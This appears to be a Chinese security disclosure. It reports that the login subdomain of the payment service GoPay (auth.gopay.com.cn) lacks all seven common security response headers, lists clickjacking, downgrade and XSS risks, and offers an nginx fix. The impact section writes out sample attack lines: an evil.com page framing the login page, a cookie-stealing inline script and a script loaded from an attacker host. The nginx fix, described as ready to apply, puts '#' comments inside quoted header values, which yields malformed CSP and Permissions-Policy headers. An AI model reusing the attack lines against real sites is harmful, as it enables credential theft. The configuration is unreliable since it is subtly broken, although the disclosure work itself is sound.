# 【二、漏洞详情 - 描述】
国付宝登录子域 auth.gopay.com.cn 存在**架构级7项安全响应头零配置缺陷**（7/7全部缺失，100%无任何安全加固头）：
```
  ①  Strict-Transport-Security (HSTS)     → ❌缺失
  ②  X-Frame-Options (XFO)                → ❌缺失  ← 导致点击劫持
  ③  Content-Security-Policy (CSP)        → ❌缺失  ← 无脚本白名单
  ④  X-Content-Type-Options (XCTO)        → ❌缺失  ← MIME嗅探
  ⑤  X-XSS-Protection (XXSS)              → ❌缺失  ← 浏览器XSS审计器关闭
  ⑥  Referrer-Policy (RP)                 → ❌缺失  ← URL通过Referer泄露
  ⑦  Permissions-Policy (PP)              → ❌缺失  ← 浏览器敏感API未禁用
```

由于7项全缺（行业基准：普通站通常缺失2-3项；金融支付类站点应有5+项加固），在登录页面上叠加形成**多维度复合风险**：
- **点击劫持（CWE-1021）**：XFO+CSP frame-ancestors双缺 → 可透明iframe嵌入登录页，覆盖诱导层钓鱼
- **HTTP中间人降级**：无HSTS + HTTP明文返回410无跳转 → 用户输入http://不会自动升级HTTPS
- **XSS载荷不受限**：无CSP script-src/default-src白名单 → 若有任何反射点可直接执行任意JS
- **MIME嗅探攻击**：无XCTO nosniff
- **Referer泄露URL敏感参数**：Referrer-Policy缺
- **敏感API未禁用**：geolocation/camera/microphone/clipboard等浏览器权限未通过PP提前禁止

# 【五、危害影响（分维度）】

## 影响1：点击劫持钓鱼（CWE-1021，最严重）
登录页无XFO+CSP frame-ancestors保护 → 攻击者可：
1. 在恶意站 evil.com 透明嵌入 `https://auth.gopay.com.cn/`（opacity=0）
2. 上层放伪造的「国付宝密码找回」表单或「领取奖励」按钮
3. 用户输入的账号密码实际进入真实auth登录页（视觉欺骗）
4. 用户点击的「提交」按钮，实际点击到了真实登录页的登录按钮
5. 配合Referrer-Policy缺失，跳转URL可能携带登录后状态/跳转路径

## 影响2：HTTP中间人降级（CWE-319）
无HSTS + HTTP不跳HTTPS → 用户在：
- 公共WiFi（酒店、机场、咖啡厅）
- 运营商层（HTTP劫持）
- DNS污染环境下

攻击者可中间人截断HTTP明文请求，返回伪造的「国付宝登录维护」页诱导用户输入账号密码到假站。

## 影响3：XSS无CSP限制（CWE-79叠加风险）
若登录页存在任何反射点（如URL参数、错误页回显、用户名），因无CSP限制：
- 内联脚本不受 `script-src 'self'` 限制 → 直接 `<script>steal_cookie()</script>` 执行
- 可加载第三方域脚本：`<script src=//attacker/x.js>`
- 无object-src限制 → 可加载插件（Flash/Silverlight，取决于浏览器）

## 影响4：MIME嗅探（CWE-116）
无X-Content-Type-Options: nosniff → 浏览器会尝试猜测Content-Type，可能将txt/img解析为脚本执行（结合上传点）。

## 影响5：Referer泄露（CWE-200）
Referrer-Policy缺 → 从登录页跳第三方时，URL含session_token/redirect_uri等参数会通过Referer完整外泄。

## 影响6：敏感API未禁用（CWE-732）
无Permissions-Policy → 页面可在用户未主动授权前，尝试调用：
- geolocation：获取用户GPS定位
- camera/microphone：请求摄像头/麦克风权限（权限弹窗本身即钓鱼风险）
- clipboard-read：读取剪贴板（可能存有密码/银行卡号）

# 【六、修复方案（Nginx可直接套用，不影响业务）】
建议在 auth.gopay.com.cn 的 HTTPS server块添加以下配置：
```nginx
server {
    listen 443 ssl http2;
    server_name auth.gopay.com.cn;

    # ========== 安全响应头 修复方案 ==========
    # 1. HSTS - 强制HTTPS 1年+子域+浏览器预加载
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # 2. XFO - 禁止任何第三方iframe嵌入（DENY最严，登录页适用）
    add_header X-Frame-Options "DENY" always;

    # 3. CSP - 登录页最小权限原则（根据业务实际域名调整script-src/style-src/img-src）
    add_header Content-Security-Policy "
      default-src 'self';
      script-src 'self';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self' data:;
      connect-src 'self';
      frame-ancestors 'self';     # ← 关键：防止点击劫持（替代XFO的现代方案，建议双写）
      form-action 'self';
      base-uri 'self';
      object-src 'none';          # ← 禁止Flash/Silverlight/Java
      worker-src 'none';
    " always;

    # 4. XCTO - 禁用MIME嗅探
    add_header X-Content-Type-Options "nosniff" always;

    # 5. XXSS - 启用浏览器XSS审计器
    add_header X-XSS-Protection "1; mode=block" always;

    # 6. RP - 严格来源策略（仅origin给同源，第三方不发送full URL）
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # 7. PP - 禁用所有敏感浏览器API（登录页无需这些功能）
    add_header Permissions-Policy "
      geolocation=(),
      camera=(),
      microphone=(),
      clipboard-read=(),
      clipboard-write=(self),
      fullscreen=(self),
      payment=(self)
    " always;

    # ================ 其他配套 ================
    # HTTP 301强制跳转HTTPS（配套HSTS）
    # server { listen 80; server_name auth.gopay.com.cn; return 301 https://$host$request_uri; }
}
```

## HTTP明文配套修复：
```nginx
server {
    listen 80;
    server_name auth.gopay.com.cn;
    # 禁用410，改为301永久跳HTTPS
    return 301 https://auth.gopay.com.cn$request_uri;
}
```
